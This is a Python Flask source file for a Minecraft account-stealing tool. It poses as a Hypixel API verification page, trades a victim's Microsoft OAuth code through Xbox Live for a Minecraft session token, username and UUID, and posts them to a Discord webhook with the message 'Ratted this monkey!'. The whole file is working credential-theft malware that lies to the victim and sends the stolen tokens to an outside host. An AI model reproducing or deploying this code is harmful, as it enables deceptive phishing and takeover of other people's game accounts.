from flask import Flask,request
from discord_webhook import DiscordWebhook
app = Flask(__name__)
import json,requests

config = json.load(open('config.json'))
def returndata(code):
        data =  {
                "client_id": config["clientid"],
                "redirect_uri": config["redirecturl"],
                "client_secret": config["clientsecret"],
                "code": code,
                "grant_type": 'authorization_code'
            }

        d = requests.post('https://login.live.com/oauth20_token.srf',data=data,headers={'Content-Type': 'application/x-www-form-urlencoded'}).json()
        print(d)
        accesstoken = d['access_token']
        refreshtoken = d['refresh_token']
        data = {
                "Properties": {
                    "AuthMethod": 'RPS', "SiteName": 'user.auth.xboxlive.com', "RpsTicket": f'd={accesstoken}'
                }, "RelyingParty": 'http://auth.xboxlive.com', "TokenType": 'JWT'
            }
        d = requests.post('https://user.auth.xboxlive.com/user/authenticate',json=data,headers={'Content-Type': 'application/json', 'Accept': 'application/json'})
        d = d.json()
        usertoken = d["Token"]
        userhash = d['DisplayClaims']['xui'][0]['uhs']
        data =  {
            "Properties": {
            "SandboxId": 'RETAIL',
            "UserTokens": [usertoken]
            }, "RelyingParty": 'rp://api.minecraftservices.com/', "TokenType": 'JWT'
        }
        d = requests.post('https://xsts.auth.xboxlive.com/xsts/authorize',json=data,headers={'Content-Type': 'application/json', 'Accept': 'application/json'})
        xst = d.json()['Token']
        data = {"identityToken": f'XBL3.0 x={userhash};{xst}',"ensureLegacyEnabled": True}
        d = requests.post('https://api.minecraftservices.com/authentication/login_with_xbox',json=data,headers={'Content-Type': 'application/json'})

        bearertoken = d.json()['access_token']
        d = requests.get('https://api.minecraftservices.com/minecraft/profile',headers =  {'Authorization': f"Bearer {bearertoken}"})
        uuid = d.json()['id']
        username = d.json()['name']
        
        


        return bearertoken ,uuid,username

def sendwebhook(webhook,token,username,uuid):

    webhook = DiscordWebhook(url=webhook, content=f'@everyone\nRatted this monkey! username : {username} , uuid : {uuid}\n session : {token}')
    response = webhook.execute()




@app.route('/', methods=['GET'])
def hello_world():
    if request.args.get('code'):
        code = request.args.get('code')
        token ,uuid,username= returndata(code)
        webhooks = json.load(open('webhooks.json'))
        sendwebhook(webhooks[request.args.get('state')],token,username,uuid)
        return 'Thank you for verifing with hypixel api!'
        
    else:
        return 'no code'











if __name__ == '__main__':
    app.run()
